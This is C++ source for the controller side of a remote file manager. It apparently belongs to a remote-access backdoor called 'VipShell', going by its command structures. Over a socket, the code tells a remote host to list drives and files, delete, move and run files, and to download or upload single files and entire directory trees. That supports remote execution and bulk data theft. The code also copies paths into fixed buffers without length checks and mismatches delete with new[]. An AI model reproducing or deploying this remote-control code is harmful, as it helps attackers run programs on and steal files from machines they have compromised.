#include "stdafx.h"
#include ".\filemanage.h"
#include ".\serverfilemanagehandle.h"

CServerFileManageHandle::CServerFileManageHandle(void)
{
	m_hCallBack = NULL;
	m_dwBuffLen = 0;
	m_pBuffData = NULL;
}

CServerFileManageHandle::~CServerFileManageHandle(void)
{
	if(m_pBuffData)
		delete m_pBuffData;
}
BYTE* CServerFileManageHandle::__NewBuff(DWORD dwLen)
{
	if(dwLen <= m_dwBuffLen )
		return m_pBuffData;
	if(m_pBuffData)
		delete m_pBuffData;
	m_pBuffData = new BYTE[dwLen];
	if(!m_pBuffData)
		m_dwBuffLen = 0;
	else
		m_dwBuffLen = dwLen;
	return m_pBuffData;
}
void CServerFileManageHandle::SetCallBack(CFileManageCallBack* e)
{
	m_hCallBack = e;
}
bool CServerFileManageHandle::GetRoot(File_Root_Vector* pVector)
{
	pVector->clear();
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = FILE_GETROOT;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	DWORD dwFileSize =  cmd.dw1;
	BYTE* pBuf = __NewBuff(dwFileSize * sizeof(structFileInfo));
	cmd.dwCmd = CMD_ISOK;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	nRet = _RecvBuffData(pBuf, dwFileSize * sizeof(structFileInfo));
	if(nRet == SOCKET_ERROR)
		return false;
	structFileInfo info;
	for(DWORD i = 0; i < dwFileSize; i++)
	{
		memcpy(&info, pBuf + i * sizeof(structFileInfo), sizeof(structFileInfo));
		pVector->push_back(info);
	}
	return true;
}

bool CServerFileManageHandle::GetFileInfo(LPCWSTR szPath, File_Info_Vector* pVector)
{
	pVector->clear();
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = FILE_GETFILEPATH;
	lstrcpy((WCHAR*)cmd.pBuff, szPath);
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	DWORD dwFileSize =  cmd.dw1;
	BYTE* pBuf = __NewBuff(dwFileSize * sizeof(tagVipShellFileInfo));
	cmd.dwCmd = CMD_ISOK;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	nRet = _RecvBuffData(pBuf, dwFileSize * sizeof(tagVipShellFileInfo));
	if(nRet == SOCKET_ERROR)
		return false;
	tagVipShellFileInfo info;
	for(DWORD i = 0; i < dwFileSize; i++)
	{
		memcpy(&info, pBuf + i * sizeof(tagVipShellFileInfo), sizeof(tagVipShellFileInfo));
		pVector->push_back(info);
	}
	return true;
}
bool CServerFileManageHandle::CreateDir(LPCWSTR szPath)
{
	tagVipShellCmd cmd;
	cmd.dwCmd = FILE_CREATEDIR;
	memset(cmd.pBuff, 0, sizeof(cmd.pBuff));
	lstrcpy((LPWSTR)cmd.pBuff, szPath);
	int nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(cmd.dwCmd != CMD_ISOK)
		return false;
	return true;
}
bool CServerFileManageHandle::DelFile(LPCWSTR szPath)
{
	tagVipShellCmd cmd;
	cmd.dwCmd = FILE_DELETEFILE;
	memset(cmd.pBuff, 0, sizeof(cmd.pBuff));
	lstrcpy((LPWSTR)cmd.pBuff, szPath);
	int nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}
bool CServerFileManageHandle::RunFile(LPCWSTR szPath, LPCWSTR szPathDir, DWORD nCmdShow)
{
	tagVipShellCmd cmd;
	cmd.dwCmd = FILE_RUNFILE;
	cmd.dw1 = nCmdShow;
	strcpy((char*)cmd.pBuff, CW2A(szPath));
	strcpy((char*)cmd.pBuff + 256, CW2A(szPathDir));
	int nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}
bool CServerFileManageHandle::MoveFile(LPCWSTR szPath, LPCWSTR szPath1)
{
	tagVipShellCmd cmd;
	cmd.dwCmd = FILE_MOVEFILE;
	strcpy((char*)cmd.pBuff, CW2A(szPath));
	strcpy((char*)cmd.pBuff + 256, CW2A(szPath1));
	int nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}


bool CServerFileManageHandle::__RecvFile(LPCTSTR szFile, LPCWSTR szRemote, DWORD dwSize)
{
	FILE* fp = _wfopen(szFile, L"wb");
	if(fp == NULL)
		return false;
	if( dwSize == 0)
	{
		fclose(fp);
		return true;
	}
	DWORD dwlen = dwSize;
	DWORD dwSendBuflen = 16 * 1024;
	BYTE Buf[16 * 1024];
	DWORD dwSendLen = 0;
	DWORD dwSended;
	DWORD dwRbuf = dwlen;
	bool bIsOk = false;
	DWORD dwStartTime = GetTickCount();
	while(dwSendLen < dwlen)
	{
		dwRbuf = (dwlen - dwSendLen);
		if( dwRbuf >=  dwSendBuflen)
		{
			dwSended = m_hServer.Recv(Buf, dwSendBuflen);
			if( dwSended == SOCKET_ERROR)
		    	break;
		}
		else
		{
			dwSended = m_hServer.Recv(Buf, dwRbuf);
			if( dwSended == SOCKET_ERROR)
		    	break;
		}
		fwrite(Buf, 1, dwSended, fp);
		dwSendLen += dwSended;
		if(m_hCallBack)
			m_hCallBack->OnDownFileIng(szFile, szRemote, dwSize, dwSendLen, dwStartTime);
	}
	if(dwSendLen == dwlen)
		bIsOk =true;
	fclose(fp);
	return bIsOk;
}
bool CServerFileManageHandle::__SendFile(LPCTSTR szFile, LPCWSTR szRemote)
{
	DWORD dwFileLen = __GetFileSize(szFile);
	HANDLE hFile = CreateFile(szFile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return false;
	DWORD dwRead = 0;
	BYTE Buf[16 * 1024];
	bool bRet = false;
	int nSendLen = 0;
	DWORD dwSended = 0 ;
	DWORD dwStartTime = GetTickCount();
	while(true)
	{
		ReadFile(hFile, Buf, 16 * 1024, &dwRead, 0);
		if(dwRead == 0)
		{
			bRet = TRUE;
			break;
		}
		nSendLen = _SendBuffData(Buf, dwRead);
		if( nSendLen == SOCKET_ERROR)
		{
			m_hServer.Close();
			break;
		}
		dwSended += nSendLen;
		if(m_hCallBack)
			m_hCallBack->OnUpFileIng(szFile, szRemote, dwFileLen, dwSended, dwStartTime);
	}
	CloseHandle(hFile);
	return bRet;
}
DWORD CServerFileManageHandle::__GetFileSize(LPCTSTR szFile)
{
	DWORD dwSize;
	HANDLE hFile = CreateFile(szFile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return -1;
	dwSize = GetFileSize (hFile, NULL) ; 
	if (dwSize == INVALID_FILE_SIZE) 
	{
		CloseHandle(hFile);
		return -1;
	}
	CloseHandle(hFile);
	return dwSize;
}
bool CServerFileManageHandle::DowndFile(LPCWSTR szPath, LPCWSTR szRemote)
{
	tagVipShellCmd cmd;
	cmd.dwCmd = FILE_DWONFILE;
	memset(cmd.pBuff, 0, sizeof(cmd.pBuff));
	lstrcpy((LPTSTR)cmd.pBuff, szRemote);
	int nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if( cmd.dw1 == 0 )
		__RecvFile(szPath, szRemote, 0);
	if( cmd.dw1 == -1 )
		return false;
	DWORD dwFileLen = cmd.dw1;
	cmd.dwCmd = CMD_ISOK;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	bool bIsOk = __RecvFile(szPath, szRemote, dwFileLen);
	return bIsOk;
}
bool CServerFileManageHandle::UpFile(LPCWSTR szPath, LPCWSTR szRemote)
{
	DWORD dwFileSize = __GetFileSize(szPath);
	if(dwFileSize == -1)
		return false;
	tagVipShellCmd cmd;
	cmd.dwCmd = FILE_UPFILE;
	cmd.dw1 = dwFileSize;
	memset(cmd.pBuff, 0, sizeof(cmd.pBuff));
	lstrcpy((LPTSTR)cmd.pBuff, szRemote);
	int nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(dwFileSize == 0)
		return true;
	bool bSend = __SendFile(szPath, szRemote);
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return bSend;
}

bool CServerFileManageHandle::DowndFileDir(LPCWSTR szPath, LPCWSTR szRemote)
{
	std::wstring strPath = szRemote;
	
	if( szPath[lstrlen(szPath) -1] != _T('\\') )
		strPath +=  _T("\\");
	{{
		std::wstring strPath = szPath;
		if( szPath[lstrlen(szPath) -1] != _T('\\') )
			strPath +=  _T("\\");
		BOOL bOK = CreateDirectory(strPath.c_str(), NULL);
		if(!bOK)
			return false;
	}}
	
	File_Info_Vector Vector;
	bool bIsOk = GetFileInfo(strPath.c_str(), &Vector);
	if(!bIsOk)
		return false;
	DWORD dwFileCount = Vector.size();
	for(DWORD i = 0; i < Vector.size(); i++)
	{
		if(lstrcmp(Vector[i].cFileName, _T(".")) == 0)
			continue;
		if(lstrcmp(Vector[i].cFileName, _T("..")) == 0)
			continue;			
		std::wstring strPath = szPath;
		if( szPath[lstrlen(szPath) -1] != _T('\\') )
			strPath +=  _T("\\");

		std::wstring strRemote = szRemote;
		if( szRemote[lstrlen(szRemote) -1] != _T('\\') )
			strRemote +=  _T("\\");
		if(Vector[i].bIsDir)
		{
			strPath +=  Vector[i].cFileName;
			strPath +=  _T("\\");
			strRemote += Vector[i].cFileName;
			strRemote +=  _T("\\");
			bIsOk = DowndFileDir(strPath.c_str(), strRemote.c_str());
			if(!bIsOk)
				return false;
		}
		else
		{
			strPath +=  Vector[i].cFileName;
			strRemote += Vector[i].cFileName;
			bIsOk = DowndFile(strPath.c_str(), strRemote.c_str());
			if(!bIsOk)
				return false;
		}
	}
	return true;
}

bool CServerFileManageHandle::UpFileDir(LPCWSTR szPath, LPCWSTR szRemote)
{
	CFileManage hFileManage;
	hFileManage.GetFileInfo(szPath);
	bool bIsOk;

	{{
		std::wstring strRemote = szRemote;
		if( szRemote[lstrlen(szRemote) -1] != _T('\\') )
			strRemote +=  _T("\\");
		bIsOk =  CreateDir(strRemote.c_str());
		if (!bIsOk)
			return false;
	}}


	for(DWORD i = 0; i < hFileManage.m_Fileinfo.size(); i++)
	{
		if(lstrcmp(hFileManage.m_Fileinfo[i].cFileName, _T(".")) == 0)
			continue;
		if(lstrcmp(hFileManage.m_Fileinfo[i].cFileName, _T("..")) == 0)
			continue;
		std::wstring strPath = szPath;
		if( szPath[lstrlen(szPath) -1] != _T('\\') )
			strPath +=  _T("\\");

		std::wstring strRemote = szRemote;
		if( szRemote[lstrlen(szRemote) -1] != _T('\\') )
			strRemote +=  _T("\\");
		if(hFileManage.m_Fileinfo[i].bIsDir)
		{
			strPath +=  hFileManage.m_Fileinfo[i].cFileName;
			strPath +=  _T("\\");
			strRemote += hFileManage.m_Fileinfo[i].cFileName;
			strRemote +=  _T("\\");
			bIsOk = UpFileDir(strPath.c_str(), strRemote.c_str());
			if(!bIsOk)
				return false;
		}
		else
		{
			strPath +=  hFileManage.m_Fileinfo[i].cFileName;
			strRemote += hFileManage.m_Fileinfo[i].cFileName;
			bIsOk = UpFile(strPath.c_str(), strRemote.c_str());
			if(!bIsOk)
				return false;
		}
	}
	return true;
}